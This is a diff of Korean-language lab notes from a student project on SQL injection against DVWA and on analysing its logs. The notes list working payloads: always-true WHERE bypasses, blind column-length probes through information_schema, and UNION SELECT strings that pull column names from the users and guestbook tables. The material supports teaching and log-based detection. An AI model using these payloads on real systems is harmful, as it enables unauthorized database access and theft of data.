@@ -1,10 +1,10 @@
-##  SQL Injection 구현 및 log 분석
+## SQL Injection 구현 및 log 분석
 SQL injection: 주민서, 이종학
 
 log 분석: 김현서, 허남정, 오성택
 
 ---
-###  1. 조건문을 이용한 SQL Injection
+### 1. 조건문을 이용한 SQL Injection
 이 유형의 payload는 WHERE절의 조건을 항상 참으로 만들어 조건을 우회하는 방법 입니다.
 - ' OR 1=1 #
 - ' OR TRUE #
@@ -42,9 +42,18 @@ database() 함수는 MySQL에서 현재 연결된 데이터베이스의 이름�
 ---
 ### 4. 컬럼 길이 확인
 특정 테이블의 컬럼 이름 길이를 알아내기 위한 payload입니다. information_schema.columns과 LENGTH() 함수를 이용해 특정 테이블의 컬럼 이름의 길이를 추측해 데이터베이스 구조를 탐색합니다.
-- 
 - '1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=1) #`
 - '1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=2) #`
 - '1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=3) #`
 
 위 쿼리를 보면 이름의 길이를 순차적으로 증가시키며, 데이터베이스 구조를 탐색하려는 의도임을 알 수 있습니다.
+
+---
+### 5. 컬럼 이름 확인
+이 페이로드는 information_schema를 이용해 특정 테이블의 컬럼 이름을 추출합니다. LIMIT 절을 사용해 특정 위치의 컬럼 이름을 선택합니다.
+- ' UNION SELECT 1,column_name from information_schema.columns WHERE table_name='guestbook' LIMIT 2,1 #
+- ' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='guestbook' LIMIT 2,1 #
+- ' UNION select 1,column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' and table_schema='dvwa' #
+
+
+
